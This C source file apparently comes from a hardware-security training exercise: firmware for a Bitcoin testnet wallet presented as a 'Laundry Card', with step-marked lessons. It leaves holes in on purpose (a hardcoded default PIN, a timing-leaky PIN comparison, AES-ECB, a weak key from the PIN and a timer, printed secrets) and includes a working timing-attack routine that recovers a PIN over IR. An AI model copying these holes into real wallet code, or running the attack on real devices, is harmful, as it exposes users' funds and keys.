/*******************************************************************************
  Main Source File

  Company:
    Microchip Technology Inc.

  File Name:
    main.c

  Summary:
    This file contains the "main" function for a project.

  Description:
    This file contains the "main" function for a project.  The
    "main" function calls the "SYS_Initialize" function to initialize the state
    machines of all modules in the system
 *******************************************************************************/

// *****************************************************************************
// *****************************************************************************
// Section: Included Files
// *****************************************************************************
// *****************************************************************************

#include <stddef.h>                     // Defines NULL
#include <stdbool.h>                    // Defines true
#include <stdlib.h>                     // Defines EXIT_FAILURE
#include "definitions.h"                // SYS function prototypes
#include "lcd_menu.h"
#include "cryptoauthlib.h"
#include "secure_element.h"
#include "ui.h"
#include "util.h"
#include "lcd_menu.h"
#include "multi_comm.h"
#include "ir.h"
#include "hash.h"
#include "ecdsa.h"
#include <time.h>

#include "bip32.h"
#include "bip39.h"
#include "bitcoin_util.h"
#include "hmac_sha512.h"
#include "aes.h"
#include "atca_helpers.h"

#include <stdint.h> // For uint32_t
#include <string.h> // For strncpy



// Define a structure with the first 8 bytes as characters and the rest as an unused byte array
typedef struct {
    char walletPin[8];
    char unused[248];
} walletData;

// Reserve the structure at the specified flash memory address
const walletData __attribute__((address(0x3FF00), keep)) thisWalletData = {
    .walletPin = "12345678", // Initialize the first 8 bytes
    .unused =
    {0} // Initialize the rest to zero
};


// SysTick configuration (raw counter, no interrupts)
#define SYSTICK_MAX_COUNT (0xFFFFFFF) // 24-bit counter

void MAIN_Init(void);

uint8_t u8_AES_Key[16];
uint8_t aesKey_Expanded[176];
rx_t rx;

#define ENCRYPTED_WALLET_SIZE 336
#define PLAIN_TEXT_WALLET_SIZE 326

#define PIN_MAX_LENGTH 12

//m/84'/1'/0'x
extern uint32_t path[4];
extern char ui_screen_text[128];

WALLET_t wallet __attribute__((aligned(16)));

// Convert SysTick count difference to microseconds
static inline uint32_t SysTickDiffToUs(uint32_t start, uint32_t end) {
    // Handle wraparound (down-counter)
    uint32_t diff = (start >= end) ? (start - end) : (SYSTICK_MAX_COUNT - end + start + 1);
    return diff;
}

#if 1
void SECURE_ELEMENT_GetRandom(uint8_t * random) {
    //Step Random 4
	ATCADevice atcab_device = {0};
    uint8_t message_buffer[9 + 16 + 32] = {0};

    //Unique Value
    SECURE_ELEMENT_GetSerial(message_buffer);

    //Pseudo RNG
    for (int i = 9; i < sizeof (message_buffer); i++) {
        uint8_t random_byte = (uint8_t)rand();
        memcpy((uint8_t*)&message_buffer[i], &random_byte, 1);
    }

    //Strong RNG from secure element
    calib_random(atcab_device, &message_buffer[25]);

    //Hash All RNG Data
    sha256(message_buffer, sizeof (message_buffer), random);

    print_hex(message_buffer, sizeof (message_buffer), "message_buffer");

}
#else
void SECURE_ELEMENT_GetRandom(uint8_t * random) {
    //Step Random 4
    ATCA_STATUS status;
    status = atcab_random(random);
    CHECK_STATUS(status);
}
#endif

bool BTC_RestoreWallet(const char* mnemonic, char* passphrase, WALLET_t *w) {

    //Step Random 6
    uint8_t seed[BIP39_SEED_LEN];
    printf("Validating mnemonic\n");
    if (bip39_validate_mnemonic(mnemonic)) {
        printf("Mnemonic is good\n");
    } else {
        printf("Mnemonic is invalid\n");
        return false;
    }
    printf("Calculating master secrets....\n");
    bip39_mnemonic_to_seed(mnemonic, passphrase, seed, sizeof (seed));
    bip32SeedToNode(w->master_node, seed, sizeof (seed));
    path[3] = 0x00; //path for main account
    bip32DerivePrivate(w->main_account_parent_node, &w->main_account_parent_node[32], w->master_node, path, 4); //get parent for path
    //calculate name
    uint8_t name_buffer[64];
    hmacSha512(name_buffer, (const uint8_t *) "Wallet Name", 11, w->master_node, 64);
    sprintf(w->name, "%02x%02x", name_buffer[0], name_buffer[1]);
    w->name[5] = '\0'; // Null terminate the string
    memcpy(w->words, mnemonic, strlen(mnemonic));
    w->isLoaded = true;

    return true;
}

void UI_CLI_DisplayAddresses(void) {
    printf("Get wallet address\n");

    //Step Random 7
    uint8_t index = 0;
    uint8_t private[32];
    bip32DeriveNextPrivate(private, NULL, wallet.main_account_parent_node, index); //// m/84'/1'/0'/0/N
    printf("Path (m/84'/1'/0'/0/%d)\n", index);
    uint8_t address[43];
    uint8_t compressedpubkey[33];
    uint8_t digest[32];
    derive_testnet_public_key(private, compressedpubkey, NULL, NULL);
    derive_testnet_public_hash(compressedpubkey, digest);
    derive_testnet_address(digest, address);
    printf("Address: %s\n", address);
    printf("pubkey hash: ");
    UTIL_PrintHexString(digest, 20);

}

void UI_CLI_RestoreWalletFromPIN(void) {
	//Step 2.0 Load Wallet
	char entered_pin[PIN_MAX_LENGTH];

	//Display Selected option
	printf("Open saved account with PIN\n");

	//Prompt user for PIN
	MULTI_COMM_Print("Enter PIN: ", true);

    uint8_t u8_index = 0; // Index for accessing buffer positions.
    char input_char = 0; // Variable to hold each character read from the USART.
    memset(entered_pin, 0x00, sizeof (entered_pin));
    // Continuously read characters until the password buffer is full.
    while ((u8_index < PIN_MAX_LENGTH)) {
        // Wait until data is ready to be received from USART.
        while (!MULTI_COMM_ReceiverIsReady());
        // Read a byte from USART.
        input_char = MULTI_COMM_ReadByte(NULL);
        u8_index++;
        // Check if the received character is a line feed
        if (input_char == LINE_FEED) {
        	entered_pin[u8_index] = '\0'; // Null-terminate the string to end input.
            break;
        } else {
            // Store the received character into the buffer and increment the index.
        	entered_pin[u8_index - 1] = input_char;
        }
    }

	// Remove trailing newline from fgets
	entered_pin[strcspn(entered_pin, "\n")] = 0;

	// Compare entered PIN with stored PIN
	if (strcmp(entered_pin, thisWalletData.walletPin) != 0) {
		//Audit Logging
		AUDIT_LOG("[Audit @ %ld] Invalid password attempt.\n", timestamp());

		uint8_t buffer[ENCRYPTED_WALLET_SIZE];
		SECURE_ELEMENT_ReadSlot8(buffer, sizeof(buffer));

		UTIL_PrintHexString(buffer, sizeof(buffer));
		printf("\nFailed to decrypt buffer\n");
		MULTI_COMM_Print("Invalid PIN!\n", true);

		return;
	}
	MULTI_COMM_Print("Valid PIN!\n", true);

	//Load wallet from secure element
	//Step 3.2 Add Encryption
	UI_CLI_ReadWallet();
	bool valid = bip39_validate_mnemonic(wallet.words);

	if (!valid) {
		printf("Loaded Wallet is Corrupt!\n");
		memset(&wallet, 0x00, sizeof(wallet));
		return;
	} else {
		printf("Loaded wallet '%s'\n\n", wallet.name);
	}

}

/* Placeholder functions for wallet operations */
void UI_CLI_CreateLogin(void) {

	printf("Generating Account Login...\n");

    //Step Random 3
    char mnemonic[125] = {0};
    int error = bip39_generate_mnemonic(mnemonic);
    if (error) {
        printf("error %d", error);
    }
    bool valid = bip39_validate_mnemonic(mnemonic);
    if (!valid) {
        printf("Error - Bad mnemonic\n");
        return;
    }
    printf("\n\nWords: %s\n\n", mnemonic);

    return;
}

//Step 3.1 Add Encryption
void UI_CLI_SaveWallet(void) {
    uint8_t cipherText[ENCRYPTED_WALLET_SIZE];
    size_t outLength = 0;

	if(!wallet.isLoaded) {
		printf("No account is loaded\n");
		return;
	}
    aesEncryptECB((uint8_t *) & wallet, sizeof (wallet), cipherText, sizeof (cipherText), aesKey_Expanded, &outLength);
    SECURE_ELEMENT_WriteSlot8((const uint8_t *) &cipherText, sizeof (cipherText));
    printf("Save Complete\n");
}

void UI_SendAddress(void) {
	printf("Address: ");
    MULTI_COMM_Print(ui_screen_text, true);
    printf("\n");
}

void UI_DisplayAddress(void) {
    LCD_MENU_EnterSubMenu();

    //Step Random 8
    sprintf(ui_screen_text, "(m/84'/1'/0'/0/%d)", 0);
    LCD_MENU_DisplayTextBuffer(ui_screen_text, 0);
    LCD_MENU_RefreshScreen();
    LCD_MENU_DisplayTextBuffer("wait...", 1);
    LCD_MENU_RefreshScreen();
    uint8_t private[32];
    bip32DeriveNextPrivate(private, NULL, wallet.main_account_parent_node, 0); //// m/84'/1'/0'/0/N
    derive_testnet_public_address(private, (uint8_t*)ui_screen_text);
    MULTI_COMM_Print(ui_screen_text, true);

    //dynamically set the address to be printed when enter is pressed
    resultsSubMenu[0].action = UI_SendAddress;

    LCD_MENU_BufferToDisplayText(ui_screen_text, strlen(ui_screen_text), MENU_MODE_RESULTS);
}

void UI_TimingAttack(void) {
	// Step Timing Bonus 1

    LCD_MENU_EnterSubMenu();

    // Display initial screen
    LCD_MENU_DisplayTextBuffer("<Timing Attack>", 0);

    // Reset menu to known state
    IR_SendMessage("\n", 0, NULL);
    IR_SendMessage("9", 0, NULL);

    // Select "Load Saved Account" (option 3)
    if (!IR_SendMessage("3", 3, "Enter PIN:")) {
        SysTick->CTRL = 0; // Disable SysTick
        LCD_MENU_DisplayTextBuffer("Error: Menu Fail", 1);
        LCD_MENU_RefreshScreen();
        return;
    }

    sprintf(ui_screen_text, "working...");
    LCD_MENU_DisplayTextBuffer(ui_screen_text, 2);

    // PIN storage (4 digits + null terminator)
    char pin[PIN_MAX_LENGTH + 1] = {0};
    const int NUM_TRIALS = 2;  // Trials per digit
    const int MAX_RETRIES = 1; // Retry attempts
    uint32_t min_time;    // Min response time
    char best_digit;           // Digit with max time

    // Loop through each PIN position
    for (int pos = 0; pos < PIN_MAX_LENGTH; pos++) {
    	min_time = 0xFFFFFFFF;
        best_digit = '0';

        // Test each digit (0-9)
        for (char digit = '0'; digit <= '9'; digit++) {
            uint32_t total_time = 0;
            int successful_trials = 0;

            // Run multiple trials
            for (int trial = 0; trial < NUM_TRIALS; trial++) {
                int retry_count = 0;
                bool response_received = false;
                uint32_t response_time = 0;

                // Construct partial PIN
                char test_pin[PIN_MAX_LENGTH + 1] = {0};
                strncpy(test_pin, pin, pos);
                test_pin[pos] = digit;
                test_pin[pos + 1] = '\0';

                // Retry loop
                while (retry_count < MAX_RETRIES && !response_received) {
                    // Reset menu to PIN prompt
                    if (!IR_SendMessage("3", 3, "Enter PIN:")) {
                        retry_count++;
                        continue;
                    }

                    // Send PIN
                    sprintf(ui_screen_text, "%s", test_pin);
                    // Wait for response ("Invalid PIN!" or "Valid PIN!")
                    SYSTICK_TimerRestart();
                    if (IR_SendMessage(ui_screen_text, 0, "Invalid PIN!")) { // Check for "PIN!" in response
                    	response_time = SYSTICK_TimerCounterGet();
                        response_received = true;
                        printf("	time %lu\n", response_time);

                    } else {
                        // Check for success
                        if (UTIL_StringContains((char *) ir_packet.buffer, "Valid PIN!")) {
                            // Success: store PIN and exit
                            strcpy(pin, test_pin);
                            goto success_exit;
                        }

                        retry_count++;

                    }

                    LCD_MENU_RefreshScreen();

                }

                // Check for retry exhaustion
                if (!response_received) {
                    SysTick->CTRL = 0; // Disable SysTick
                    LCD_MENU_DisplayTextBuffer("Error: No Response", 1);
                    LCD_MENU_RefreshScreen();
                    return;
                }

                total_time += response_time;
                successful_trials++;
            }

            // Calculate average time
            uint32_t avg_time = (successful_trials > 0) ? (total_time / successful_trials) : 0;
            printf("digit %c, avg_time: %lu\n", digit, avg_time);
            
            // Update best digit
            if (avg_time < min_time) {
                int diff = min_time - avg_time;
                min_time = avg_time;
                best_digit = digit;

                //Assume we got it.
                if(digit > '0' && diff > 5000) {
                    break;
                }

            }
        }

        // Store best digit
        pin[pos] = best_digit;
    }

    return;

success_exit:
    // Disable SysTick
    SysTick->CTRL = 0;

    // Display PIN
    sprintf(ui_screen_text, "PIN: %s", pin);
    printf("Success: %s\n", ui_screen_text);
    LCD_MENU_DisplayTextBuffer(ui_screen_text, 2);
    LCD_MENU_RefreshScreen();

    return;
}

//Step 3.0 Add Encryption
void UI_CLI_HelperSetPIN() {
    char entered_pin[32];
    walletData tempWallet;

    // Prompt user for PIN
    printf("Enter new 8 digit PIN: ");
    if (fgets(entered_pin, sizeof (entered_pin), stdin) == NULL) {
        printf("Error reading PIN input.\n");
        return;
    }

    // Remove trailing newline from fgets
    entered_pin[strcspn(entered_pin, "\n")] = 0;

    // Check length
    if (strlen(entered_pin) != 8) {
        printf("PIN must be exactly 8 digits.\n");
        return;
    }

    // Check that all characters are digits
    for (int i = 0; i < 8; i++) {
        if (!isdigit((unsigned char) entered_pin[i])) {
            printf("PIN must contain only digits.\n");
            return;
        }
    }

    // If you reach here, the PIN is valid
    printf("PIN accepted: %s\n", entered_pin);

    //Store the PIN securely here
    // Read the flash memory
    memcpy(&tempWallet, (const void *) 0x3FF00, 256);

    //Modify
    memcpy(tempWallet.walletPin, entered_pin, 8);
    //Erase
    NVMCTRL_RowErase(0x3FF00);
    while (NVMCTRL_IsBusy());
    //Write
    NVMCTRL_PageWrite((uint32_t *) & tempWallet, 0x3FF00);
    while (NVMCTRL_IsBusy());

}

void BITCOIN_UTIL_CreateWalletEncryptionKey() {
    uint8_t digestkey[32];
    uint32_t timestamp;
    uint8_t message[256];

    printf("Generating encryption key...\n");
    //Grab random time stamp
    timestamp = SYSTICK_TimerCounterGet();
    printf("SYSTICK timestamp: %lu\n", (unsigned long)timestamp);

    //Grab secret pin
    UI_CLI_HelperSetPIN();

    memcpy(message, (const void *) 0x3FF00, 8);

    //Add in time stamp
    message[8] = (timestamp >> 16) & 0xFF;
    message[9] = (timestamp >> 8) & 0xFF;
    message[10] = timestamp & 0xFF;
    sha256(message, 11, digestkey);

    printf("\n\n Generation Complete!\n");

    //Store key on secure element
    UTIL_PrintArray(message, 16);
    UTIL_PrintArray(digestkey, 16);
    SECURE_ELEMENT_WriteSlot5(digestkey, 16);

    //Copy key to RAM
    memcpy(u8_AES_Key, digestkey, 16);
    //Expand key for AES usage
    aesExpandKey(aesKey_Expanded, u8_AES_Key);
}

void UI_CLI_ReadWallet(){
    uint8_t CipherText[ENCRYPTED_WALLET_SIZE];
    size_t outLength = 0;

    //Read wallet
    SECURE_ELEMENT_ReadSlot5(u8_AES_Key, 16);
    aesExpandKey(aesKey_Expanded, u8_AES_Key);

    SECURE_ELEMENT_ReadSlot8(CipherText, 336);

    //Decrypt wallet
    aesDecryptECB(CipherText, ENCRYPTED_WALLET_SIZE, (uint8_t *)&wallet, sizeof (wallet), aesKey_Expanded, &outLength);
}

int main(void) {
    /* Initialize all modules */
    SYS_Initialize(NULL);
    MAIN_Init();

    SYSTICK_TimerStart();

    uint8_t writeMenu = 1;
    ir_packet.state = WAITING_FOR_SYNC; // Keeping this as it seems part of your setup

    while (true) {
        /* Maintain state machines of all polled MPLAB Harmony modules. */
		SYS_Tasks();

		if (writeMenu) {
			if (!wallet.isLoaded) {
				printf("\nLaundry Card\n");
                //Step Random 1
                printf("1 - Add Funds\n");
                printf("2 - Run Wash Cycle\n");
                printf("3 - Add Time to Dryer\n");



			} else {
				printf("\nWallet name: '%s'\n", wallet.name);

				printf("1 - Display Address\n");
				printf("2 - Export Public Key\n");
				printf("3 - Sign Transaction\n");
				printf("4 - Show Words\n");
				printf("5 - Save Wallet\n");
				printf("6 - Sign Message\n");
				printf("7 - Verify Message\n");

				printf("9 - Exit Account\n");
			}

			printf("> ");
			writeMenu = 0;
		}

        MAIN_MENU_ACTIVE_LED();

        if (MULTI_COMM_GetUserInput(1)) {
            rx.receivedCount = 0; // Reset receive counter
            printf("\n");

            if (!wallet.isLoaded) {
				switch (rx.receiveBuffer[0]) {
					case '1':
						//Step Random 2
                        UI_CLI_CreateLogin();
						break;
					case '2':
						//Step Random 5
                        UI_CLI_RestoreWalletFromWords();
						break;
					case '3':
						//Step 2.1 Load Wallet
						UI_CLI_RestoreWalletFromPIN();
						break;
					case '4':
						UI_TimingAttack();
						break;
					default:
						printf("Invalid selection, please try again.\n");
						break;
				}
            } else {
            	switch (rx.receiveBuffer[0]) {
					case '1':
						UI_CLI_DisplayAddresses();
						break;
					case '2':
						UI_CLI_ExportAccountPublicKey();
						break;
					case '3':
						UI_CLI_SignRawTransaction();
						break;
					case '4':
						UI_CLI_ShowSeedOrKey();
						break;
					case '5':
						//Step 3.3 Add Encryption
						BITCOIN_UTIL_CreateWalletEncryptionKey();
						UI_CLI_SaveWallet();
						break;
					case '6':
						UI_CLI_SignMessage();
						break;
					case '7':
						UI_CLI_VerifyMessage();
						break;
					case '9':
						printf("Closing...\n");
						wallet.isLoaded = false;
						memset(wallet.master_node, 0x00, 64);
						break;
					default:
						printf("Invalid selection, please try again.\n");
						break;
				}
            }
            writeMenu = 1;
        }
    }
    return EXIT_FAILURE; // Shouldn�??t reach here with the infinite loop
}

void MAIN_Init(void) {

	SYSTICK_TimerInitialize();

    IR_EnableReceive();

    EIC_CallbackRegister(0, LCD_MENU_UpButtonPressCallback, (uintptr_t) NULL);
    EIC_CallbackRegister(1, LCD_MENU_DownButtonPressCallback, (uintptr_t) NULL);
    EIC_CallbackRegister(2, LCD_MENU_LeftButtonPressCallback, (uintptr_t) NULL);
    EIC_CallbackRegister(3, LCD_MENU_RightButtonPressCallback, (uintptr_t) NULL);
    EIC_CallbackRegister(4, LCD_MENU_EnterButtonPressCallback, (uintptr_t) NULL);

    SERCOM2_USART_ReadCallbackRegister(IR_Receive, (uintptr_t) NULL);

    NVIC_SetPriority(9, 1); //increase sercom 0 (ecc608 to run in display interrupt)

    //Init menu system
    LCD_MENU_Init();

    SERCOM5_REGS->USART_INT.SERCOM_INTENSET = SERCOM_USART_INT_INTENSET_RXC(1);
    PORT_REGS->GROUP[0].PORT_PMUX[6] = 0x0U;

    ATCA_STATUS status = ATCA_SUCCESS;

    status = atcab_init(&atecc608_0_init_data);
    CHECK_STATUS(status);

    uint8_t revision[4];
    status = atcab_info(revision);
    CHECK_STATUS(status);

    uint32_t seed = SYSTICK_TimerCounterGet();
    srand(seed);
    //printf("seed: %lu", seed); //TODO: debug only remove

    bool islocked = false;
    status = atcab_is_locked(LOCK_ZONE_CONFIG, &islocked);

    if (!islocked) { //Provision Part
        SECURE_ELEMENT_WriteConfig(0xc0);
    }

    status = atcab_is_locked(LOCK_ZONE_DATA, &islocked);
    if (!islocked) { //Provision Part
        SECURE_ELEMENT_WriteData();
    }

    rx.HideAdminMode = true;
}



/*******************************************************************************
 End of File
 */
